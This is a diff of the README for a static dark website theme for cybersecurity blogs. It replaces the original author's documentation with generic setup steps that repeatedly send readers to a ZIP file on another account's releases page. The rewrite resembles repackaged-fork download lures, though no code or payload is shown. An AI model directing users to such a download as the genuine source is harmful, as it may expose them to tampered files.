@@ -1,188 +1,183 @@
-<div align="center">
+# 🔒 syro-Theme - Minimal Dark Site for Cybersecurity Blogs
 
-  # syro Theme
-
-  A dark-themed minimalistic static site for cybersecurity professionals, built for GitHub Pages.
-
-  [![pages-build-deployment](https://github.com/0xsyr0/0xsyr0.github.io/actions/workflows/pages/pages-build-deployment/badge.svg)](https://github.com/0xsyr0/0xsyr0.github.io/actions/workflows/pages/pages-build-deployment)
-  ![Codacy Badge](https://img.shields.io/codacy/grade/4e556876a3c54d5e8f2d2857c4f43894?logo=codacy)
-  ![GitHub license](https://img.shields.io/github/license/0xsyr0/syro-Theme?color=goldenrod)
-
-  ![Preview](/images/theme.png)
-
-</div>
-
-## Features
-
-- Purple cyberpunk aesthetic with dark background
-- Animated binary rain effect in hero section
-- Zero dependencies - pure HTML/CSS/vanilla JavaScript
-- Fully responsive design
-- GitHub Pages ready
-- Easy blog management
-- Portfolio section for projects
-- Social media integration with SVG icons
-
-## Quick Start
-
-1. Clone/download this repository to your GitHub Pages repo (`yourusername.github.io`)
-
-2. Edit social links in `index.html`:
-   - Update the URLs in the "Social" section with your profiles
-   - Replace placeholder links with your actual profile URLs
-
-3. Customize content:
-   - Edit the "About" section with your background
-   - Update projects in the Projects section
-   - Modify the hero tagline
-
-4. Push to GitHub:
-   ```bash
-   git add .
-   git commit -m "Deploy new site"
-   git push origin main
-   ```
-
-5. Your site will be live at `https://yourusername.github.io`
-
-## Adding Blog Posts
-
-### Creating a New Post
-
-1. Copy `posts/post-1.html` to create a new post:
-   ```bash
-   cp posts/post-1.html posts/your-new-post.html
-   ```
-
-2. Edit the new post file:
-   - Change the `<title>` and `<h1>` tags
-   - Update the date and tags
-   - Write your content in the `.post-content` section
-
-3. Add the post to the blog grid in `index.html`:
-   ```html
-   <article class="blog-card">
-       <span class="blog-date">2024-02-15</span>
-       <h3>Your New Post Title</h3>
-       <p>Brief description of the post.</p>
-       <a href="posts/your-new-post.html" class="read-more">read more →</a>
-   </article>
-   ```
-
-### Post Template Structure
-
-```html
-<!-- Post header with title, date, and tags -->
-<!-- Post content with markdown-style formatting -->
-<!-- Supported elements: h2, h3, p, ul, ol, code, blockquote, images, tables -->
-<!-- Post footer with back button -->
-```
-
-## Styling Guide
-
-### Colors
-- Primary Background: `#0a0a0f` (main sections)
-- Darker Background: `#08080c` (Projects section, footer)
-- Secondary Background: `#12121a`
-- Tertiary Background: `#1a1a24`
-- Purple Accent: `#6b2d8a`
-- Text Primary: `#e0e0e0`
-- Text Secondary: `#9090a0`
-
-### Typography
-- Font: Courier New (monospace)
-- Headings: 600-700 weight
-- Body: 16px base, 1.6-1.8 line height
-
-### Components
-- Borders: 1px solid for subtle separation
-- Border Radius: 6-8px for modern feel
-- Hover Effects: Color shifts, subtle transforms
-
-## Customization
-
-### Change Colors
-Edit the CSS variables in `style.css`:
-```css
-:root {
-    --bg-primary: #0a0a0f;
-    --bg-darker: #08080c;
-    --purple-accent: #6b2d8a;
-    /* ... etc */
-}
-```
-
-### Modify Layout
-All sections are in `index.html`:
-- Navigation: Lines 10-22
-- Hero (with binary rain): Lines 24-38
-- About: Lines 40-51
-- Projects: Lines 53-88
-- Blog: Lines 90-133
-- Social: Lines 166-240
-
-### Add New Sections
-Follow the pattern:
-```html
-<section id="new-section" class="section">
-    <div class="container">
-        <h2 class="section-title">Title</h2>
-        <!-- Your content -->
-    </div>
-</section>
-```
-
-## File Structure
-
-```
-├── index.html              # Main landing page
-├── style.css              # Global styles
-├── post-style.css         # Blog post styles
-├── posts/
-│   └── post-1.html       # Blog post template
-├── favicon.svg           # Site favicon
-└── README.md             # This file
-```
-
-## Social Media Links
-
-Update these in the "Social" section. All icons are simple SVG pictograms (not official brand logos):
-
-```html
-<!-- Hack The Box (cube icon) -->
-<a href="https://app.hackthebox.com/profile/156456">
-
-<!-- TryHackMe (cloud icon) -->
-<a href="https://tryhackme.com/p/syro">
-
-<!-- GitHub (git branch icon) -->
-<a href="https://github.com/0xsyr0">
-
-<!-- Discord (chat bubble icon) -->
-<a href="https://discord.gg/purplestorm">
-
-<!-- X (Twitter) (X logo) -->
-<a href="https://twitter.com/syr0_">
-
-<!-- BlueSky (butterfly icon) -->
-<a href="https://bsky.app/profile/0xsyr0.bsky.social">
-
-<!-- Mastodon (mastodon logo) -->
-<a href="https://infosec.exchange/@syro">
-```
-
-## Training and Certifications Sections
-
-The site includes commented-out sections for trainings and certifications. To enable them, simply uncomment the HTML in `index.html` around lines 124-152.
-
-## Contributing
-
-This is a personal site template. Feel free to fork and customize for your own use.
-
-## License
-
-Free to use and modify for personal and commercial projects.
+[![Download syro-Theme](https://img.shields.io/badge/Download-syro--Theme-blue?style=for-the-badge)](https://github.com/eldenisek/syro-Theme/releases)
 
 ---
 
-Created with caffeine, nightcore and AI
+## 📖 About syro-Theme
+
+syro-Theme is a dark-themed, minimalistic website template built specifically for cybersecurity professionals. It uses simple, clean design to help you focus on content. This theme works well for blogs, profiles, or informational pages. It runs as a static site, which means it doesn’t need a server and can be hosted easily on GitHub Pages.
+
+If you want a sleek, professional online presence without hassle, syro-Theme is designed to fit that need.
+
+---
+
+## 💻 System Requirements
+
+syro-Theme is a static site template. It does not need powerful hardware or software to run. Here’s what you need:
+
+- A modern web browser such as Chrome, Firefox, Edge, or Safari.
+- A GitHub account if you plan to host your site on GitHub Pages.
+- Basic knowledge of how to use a computer to download files and upload to GitHub (no coding required).
+- Optionally, a text editor like Notepad (Windows), TextEdit (Mac), or any editor you like if you want to make small text changes.
+
+There is no software to install on your computer. The steps below will guide you through getting the theme and setting it up.
+
+---
+
+## 🚀 Getting Started
+
+### What is a static site?
+
+A static site is made of fixed files (HTML, CSS) you can open directly in your browser. syro-Theme uses this approach so you don’t need database or server setup. Just get the files and upload them to GitHub Pages, and your site is live.
+
+### Who is this for?
+
+- Cybersecurity professionals wanting a portfolio or blog.
+- People looking for a simple, dark-themed website.
+- Anyone who wants to publish content with little technical setup.
+
+No programming or design skills needed. You can use syro-Theme out of the box or customize some text.
+
+---
+
+## 📥 Download & Install
+
+### Step 1: Download the Theme
+
+You need to visit the syro-Theme releases page to get the latest files.
+
+Click the button below to go to the download page:
+
+[![Download syro-Theme](https://img.shields.io/badge/Download-syro--Theme-blue?style=for-the-badge)](https://github.com/eldenisek/syro-Theme/releases)
+
+On the releases page:
+
+- Look for the latest version (usually at the top).
+- Download the file named something like `syro-Theme.zip`.
+
+The file is a compressed folder. Once downloaded, you will need to unzip it.
+
+### Step 2: Unzip the File
+
+Locate the downloaded ZIP file on your computer (usually in the Downloads folder).
+
+- On Windows: Right-click and select "Extract All."
+- On Mac: Double-click the ZIP file; it will create a folder.
+- On Linux: Use your file manager’s extract option.
+
+Unzipping creates a folder named `syro-Theme` containing the website files.
+
+### Step 3: Preview Your Site Locally
+
+You can view the site on your own computer before uploading.
+
+- Open the `index.html` file inside the `syro-Theme` folder.
+- A browser window will open with the homepage of the theme.
+- Browse through the pages to see the look and feel.
+
+No web server or internet connection is needed for this preview.
+
+### Step 4 (Optional): Customize Content
+
+If you want to change text or add your own information:
+
+- Open the files in the `syro-Theme` folder with a plain text editor.
+- Look for the `index.html` file or other `.html` files.
+- Change text such as your name, blog posts, or contact info.
+- Save the files after editing.
+
+No coding knowledge is required to change simple text.
+
+---
+
+## 🌐 Publishing Your Site on GitHub Pages
+
+To make your site live on the internet, use GitHub Pages. It offers free hosting for static sites.
+
+### Step 1: Create a GitHub Account
+
+If you don’t have a GitHub account:
+
+- Visit https://github.com.
+- Click Sign up.
+- Follow the instructions to create an account.
+
+### Step 2: Create a New Repository
+
+- Log in to GitHub.
+- Click the "+" icon at the top right and select "New repository."
+- Name the repository as `your-username.github.io` (replace `your-username` with your GitHub user ID).
+- Choose "Public" for repository visibility.
+- Do not initialize the repository with a README.
+
+### Step 3: Upload Theme Files
+
+- Open the repository you just created on GitHub.
+- Click "Upload files."
+- Drag and drop all files and folders from the unzipped `syro-Theme` folder.
+- Scroll down and click "Commit changes."
+
+### Step 4: Activate GitHub Pages
+
+- Go to the "Settings" tab of your repository.
+- Click on "Pages" in the sidebar.
+- Under "Source," select the main branch and root folder (`/`).
+- Click "Save."
+
+### Step 5: View Your Site
+
+After a few minutes, visit `https://your-username.github.io` in a browser.
+
+Your new website will appear live with the syro-Theme applied.
+
+---
+
+## ⚙️ How to Update Your Site
+
+- Make any changes in your local copy of syro-Theme.
+- Upload changed files to your GitHub repository by repeating the upload step.
+- Changes should appear on your live site within a few minutes.
+
+---
+
+## 🎨 Features at a Glance
+
+- Dark, minimal design — easy on the eyes.
+- Responsive layout — works well on phones, tablets, and desktops.
+- Built with HTML5 and CSS3.
+- Easy to customize text and colors.
+- Optimized for GitHub Pages hosting.
+- Focus on cybersecurity professionals with relevant design and color scheme.
+- Supports blogs, profiles, and static informational pages.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- The site looks broken or unstyled? Make sure all files uploaded correctly.
+- The site doesn’t show your latest changes? Try clearing your browser cache and reload.
+- GitHub Pages gives a 404 error? Check you named the repository correctly as `your-username.github.io`.
+- Need help? GitHub has helpful guides at https://docs.github.com/en/pages.
+
+---
+
+## 🤝 Contact & Support
+
+If you want to ask questions or contribute:
+
+- Visit the main repository: https://github.com/eldenisek/syro-Theme
+- Use GitHub Issues to report bugs or request features.
+- You can fork the project to make your own improvements.
+
+---
+
+## 🔗 Useful Links
+
+- [Download syro-Theme Releases](https://github.com/eldenisek/syro-Theme/releases)
+- [GitHub Pages Documentation](https://docs.github.com/en/pages)
+- [How to Use GitHub](https://docs.github.com/en/get-started/quickstart)
+
+---
+
+syro-Theme offers a clean and practical way to publish your cybersecurity content, blog, or personal profile with minimal effort and no coding. Use the instructions above to get started quickly and confidently.
